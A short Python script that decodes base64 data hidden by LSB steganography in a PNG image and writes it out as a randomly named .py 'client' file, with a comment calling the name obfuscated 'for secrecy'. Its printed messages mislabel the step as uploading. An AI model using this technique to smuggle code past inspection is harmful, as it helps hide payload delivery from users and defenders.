from __future__ import absolute_import, unicode_literals
import os
import time
import base64
from LSBSteg import LSBSteg
import cv2
import random

STEGFILE = 'python.png'
CLIENT = f"{str(random.randint(1000000, 10000000000))}.py" # Obfuscated name for secrecy

# print("Extracting image contents...")
# client_contents = base64.b64encode(open(CLIENT).read().encode(encoding='ascii'))

print(f"Uploading client contents to image {STEGFILE}!")
steg = LSBSteg(cv2.imread(STEGFILE))
img_dec = steg.decode_binary()

print("Extracting image contents...")
open(CLIENT, 'w').write(base64.b64decode(img_dec).decode(encoding='ascii'))

print("Completed!")